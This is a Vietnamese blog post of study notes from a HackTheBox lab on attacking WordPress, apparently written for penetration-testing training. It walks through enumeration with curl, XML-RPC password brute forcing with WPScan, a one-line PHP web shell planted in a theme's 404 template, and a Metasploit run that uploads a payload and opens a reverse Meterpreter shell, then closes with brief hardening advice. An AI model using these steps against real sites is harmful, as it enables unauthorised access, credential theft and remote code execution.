---
title: "Hacking WordPress"
date: "2025-03-25"
excerpt: "Hacking WordPress - Hackthebox"
featured: "/images/wordpress_hacking.jpeg"
---

# Introduction

## WordPress Overview

WordPress là Hệ thống quản lý nội dung mã nguồn mở phổ biến nhất (CMS - Content Management System), nó được sử dụng cho nhiều mục đích như hosting blog, diễn đàn, quản lý dự án,...Nó có khả năng mở rộng, custom theo ý muốn, sử dụng các plugins bên thứ ba => dễ có lỗ hổng từ các themes và plugins đó.
WordPress được viết bằng PHP và chạy trên Apache cùng với MySQL ở phía backend. 

### CMS là gì?
CMS là công cụ mạnh mẽ giúp xây dựng 1 website mà không cần code mọi thứ từ đầu. Nó làm hầu hết các công việc "khó" bên cơ sở hạ tầng, tập trung vào phía giao diện của trang web nhiều hơn. Người dùng có thể tải lên phương tiện trực tiếp từ giao diện thư viện phương tiện thay vì tương tác với máy chủ web từ cổng quản lý hoặc qua FTP hoặc SFTP.
1 CMS được tạo nên từ 2 thành phần chính:
- A Content Management Application (CMA): Interface được sử dụng để thêm và quản lý nội dung.
- A Content Delivery Application (CDA): Phần backend đưa input vào CMA và đưa code vào trang web hoạt động.

## WordPress Structure

### Cấu trúc WordPress mặc định

WordPress yêu cầu đươc cài đặt và cấu hình đầy đủ cho LAMP (Linux, Apache, MySQL, PHP) trước khi được cài đặt lên Linux(Windows, MacOS). Sau khi cài đặt, tất cả các file và thư mục hỗ trợ WP có thể truy cập được trong webroot được đặt tại `/var/www/html`.

**File Structure**

```terminal
duongquanghao@ubuntu$ tree -L 1 /var/www/html
.
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

### Key WordPress Files

Thư mục gốc của WP bao gồm các file cần thiết:
- `index.php`: homepage của WP
- `license.txt`: bao gồm các thông tin, ví dụ như phiên bản WP
- `wp-active.php`: được sử dụng cho quá trình kích hoạt email khi tạo 1 trang WP mới
- Thư mục `wp-admin`: chứa trang login để quản trị viên truy cập

### WordPress Configuration File

File `wp-config.php` bao gồm các thông tin bắt buộc cho WP để kết nối DB: tên db, host, username và password, active DEBUG,...

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/** MySQL database username */
define( 'DB_USER', 'username_here' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password_here' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Authentication Unique Keys and Salts */
/* <SNIP> */
define( 'AUTH_KEY',         'put your unique phrase here' );
define( 'SECURE_AUTH_KEY',  'put your unique phrase here' );
define( 'LOGGED_IN_KEY',    'put your unique phrase here' );
define( 'NONCE_KEY',        'put your unique phrase here' );
define( 'AUTH_SALT',        'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT',   'put your unique phrase here' );
define( 'NONCE_SALT',       'put your unique phrase here' );

/** WordPress Database Table prefix */
$table_prefix = 'wp_';

/** For developers: WordPress debugging mode. */
/** <SNIP> */
define( 'WP_DEBUG', false );

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

### Key WordPress Directories

**wp-content**

Folder `wp-content` là thư mục chính nơi plugins và themes được lưu trữ. 

```
duongquanghao@ubuntu$ tree -L 1 /var/www/html/wp-content
.
├── index.php
├── plugins
└── themes
```

**wp-include**

`wp-include` gồm mọi thứ ngoại trừ thành phần của admin và các themes thuộc về web, lưu trữ các core files: certificate, fonts, JS files,...

```
duongquanghao@ubuntu$ tree -L 1 /var/www/html/wp-includes
.
├── <SNIP>
├── theme.php
├── update.php
├── user.php
├── vars.php
├── version.php
├── widgets
├── widgets.php
├── wlwmanifest.xml
├── wp-db.php
└── wp-diff.php
```

## WordPress User Roles

Có 5 loại người dùng trong WP:

|Role|Description|
|:---|:----------|
|Administrator|Có quyền truy cập các chức năng quản lý, thêm xóa người dùng, bài đăng, chỉnh sửa mã nguồn|
|Editor|Có thể công khai và quản lý bài đăng, bao gồm bài đăng của người khác|
|Author|Có thể công khai và quản lý bài đăng của mình|
|Contributor|Có thể viết và quản lý bài đăng của họ nhưng không thể công khai ra ngoài|
|Subscriber|Người dùng bình thường xem post và chỉnh sửa profile của họ|


# Enumeration

## WordPress Core Version Enumeration

Check được version => có thể tìm kiếm các lỗ hổng liên quan đến version này.
Tìm kiếm theo keyword `meta generator`

### WP Version - Source Code

Ví dụ source code:

```html
...SNIP...
<link rel='https://api.w.org/' href='http://blog.inlanefreight.com/index.php/wp-json/' />
<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://blog.inlanefreight.com/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml" /> 
<meta name="generator" content="WordPress 5.3.3" />
...SNIP...
```

```terminal
duongquanghao@ubuntu$ curl -s -X GET http://blog.inlanefreight.com | grep '<meta name="generator"'

<meta name="generator" content="WordPress 5.3.3" />
```

### WP Version - CSS

```html
...SNIP...
<link rel='stylesheet' id='bootstrap-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex-style-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='transportex_color-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3' type='text/css' media='all' />
<link rel='stylesheet' id='smartmenus-css'  href='http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3' type='text/css' media='all' />
...SNIP...
```

### WP Version - JS

```html
...SNIP...
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'></script>
<script type='text/javascript' src='http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'></script>
...SNIP...
```

Trong version WP cũ, thông tin version có thể được lưu trong README.html ở WP root directory.

## Plugins and Themes Enumeration

### Plugins

```terminal
duongquanghao@ubuntu$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/css/wprev-public_combine.css?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/plugins/wp-google-places-review-slider/public/js/wprev-public-com-min.js?ver=6.1
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=5.3.3
```

### Themes

```terminal
duongquanghao@ubuntu$ curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2

http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3
http://blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3
background: url("http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg") #50b9ce;
```

### Plugins Active Enumeration

```terminal
duongquanghao@ubuntu$ curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:08:23 GMT
Server: Apache/2.4.29 (Ubuntu)
Location: http://blog.inlanefreight.com/wp-content/plugins/mail-masta/
Content-Length: 356
Content-Type: text/html; charset=iso-8859-1
```

__Note__: Để tăng tốc độ enum, dùng tool `wfuzz` hoặc `WPScan`

## Directory Indexing

Ngoài những active plugins có thể bị tấn công thì deactive vẫn có thể tấn công được => nên xóa luôn nếu không dùng.

![image](https://hackmd.io/_uploads/SyTE0zJaJl.png)

Nếu vào thư mục plugins, ta vẫn truy cập vào plugin `Mail Masta`

![image](https://hackmd.io/_uploads/HkAOAfy61g.png)

```terminal
duongquanghao@ubuntu$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text

****** Index of /wp-content/plugins/mail-masta ******
[[ICO]]       Name                 Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                         -  
[[DIR]]       amazon_api/          2020-05-13 18:01    -  
[[DIR]]       inc/                 2020-05-13 18:01    -  
[[DIR]]       lib/                 2020-05-13 18:01    -  
[[   ]]       plugin-interface.php 2020-05-13 18:01  88K  
[[TXT]]       readme.txt           2020-05-13 18:01 2.2K  
===========================================================================
     Apache/2.4.29 (Ubuntu) Server at blog.inlanefreight.com Port 80
```

## User Enumeration

### First Method

![image](https://hackmd.io/_uploads/rJzWvQ1akx.png)

Admin thông thường sẽ có id = 1 => Thử:

```
http://blog.inlanefreight.com/?author=1
```

**Existing User**

```terminal
duongquanghao@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=1

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://blog.inlanefreight.com/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

**Non-Existing User**

```terminal
duongquanghao@htb[/htb]$ curl -s -I http://blog.inlanefreight.com/?author=100

HTTP/1.1 404 Not Found
Date: Wed, 13 May 2020 20:47:14 GMT
Server: Apache/2.4.29 (Ubuntu)
Expires: Wed, 11 Jan 1984 05:00:00 GMT
Cache-Control: no-cache, must-revalidate, max-age=0
Link: <http://blog.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8
```

### Second Method

Tương tác với JSON Endpoint, diều kiện WP ver < 4.7.1

```terminal
duongquanghao@htb[/htb]$ curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

[
  {
    "id": 1,
    "name": "admin",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/admin/",
    <SNIP>
  },
  {
    "id": 2,
    "name": "ch4p",
    "url": "",
    "description": "",
    "link": "http://blog.inlanefreight.com/index.php/author/ch4p/",
    <SNIP>
  },
<SNIP>
```

## Login

Khi ta đã có được list các username hợp lệ => bruteforce password qua trang login hoặc qua `xmlrpc.php`.

### cURL - POST Request

```
[!bash!]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

### Invalid Credentials - 403 Forbidden

```
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

## WPScan 

### WPscan - XMLRPC

```
duongquanghao@htb[/htb]$ wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/                                                  
[+] Started: Thu Apr  9 13:37:36 2020                                                                                                                                               
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```

### Remote Code Execution (RCE) via the Theme Editor

Đăng nhập với admin, sau đó vào Theme Editor

![image](https://hackmd.io/_uploads/HkxSGFkTkl.png)

![image](https://hackmd.io/_uploads/HJfIMFJT1g.png)

```php
<?php

system($_GET['cmd']);

/**
 * The template for displaying 404 pages (not found)
 *
 * @link https://codex.wordpress.org/Creating_an_Error_404_Page
<SNIP>
```

## Attacking WordPress with Metasploit

### Automating WordPress Exploitation

**Starting Metasploit Framework**

```
duongquanghao@htb[/htb]$ msfconsole
```

**MSF Search**

```
msf5 > search wp_admin

Matching Modules
================

#  Name                                       Disclosure Date  Rank       Check  Description
-  ----                                       ---------------  ----       -----  -----------
0  exploit/unix/webapp/wp_admin_shell_upload  2015-02-21       excellent  Yes    WordPress Admin Shell Upload
```

**Module Selection**

```
msf5 > use 0

msf5 exploit(unix/webapp/wp_admin_shell_upload) >
```

**List Options**

```
msf5 exploit(unix/webapp/wp_admin_shell_upload) > options

Module options (exploit/unix/webapp/wp_admin_shell_upload):

Name       Current Setting  Required  Description
----       ---------------  --------  -----------
PASSWORD                    yes       The WordPress password to authenticate with
Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT      80               yes       The target port (TCP)
SSL        false            no        Negotiate SSL/TLS for outgoing connections
TARGETURI  /                yes       The base path to the wordpress application
USERNAME                    yes       The WordPress username to authenticate with
VHOST                       no        HTTP server virtual host


Exploit target:

Id  Name
--  ----
0   WordPress
```

### Exploitation

**Set Options**

```
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set rhosts blog.inlanefreight.com
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set username admin
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set password Winter2020
msf5 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.16.8
msf5 exploit(unix/webapp/wp_admin_shell_upload) > run

[*] Started reverse TCP handler on 10.10.16.8z4444
[*] Authenticating with WordPress using admin:Winter202@...
[+] Authenticated with WordPress
[*] Uploading payload...
[*] Executing the payload at /wp—content/plugins/YtyZGFIhax/uTvAAKrAdp.php...
[*] Sending stage (38247 bytes) to blog.inlanefreight.com
[*] Meterpreter session 1 opened
[+] Deleted uTvAAKrAdp.php

meterpreter > getuid
Server username: www—data (33)
```

## WordPress Hardening

### Perform Regular Updates

```
define( 'WP_AUTO_UPDATE_CORE', true );
```

```
add_filter( 'auto_update_plugin', '__return_true' );
```

```
add_filter( 'auto_update_theme', '__return_true' );
```

### Plugin and Theme Management

Chỉ tải những plugins và themes trên WordPress.org

### User Management

- Disable tài khoản `admin` - tạo tài khoản username khác
- Thi hành chính sách password mạnh
- 2FA

### Configuration Management

- Limit login attempts
- Rename the wp-login.php login page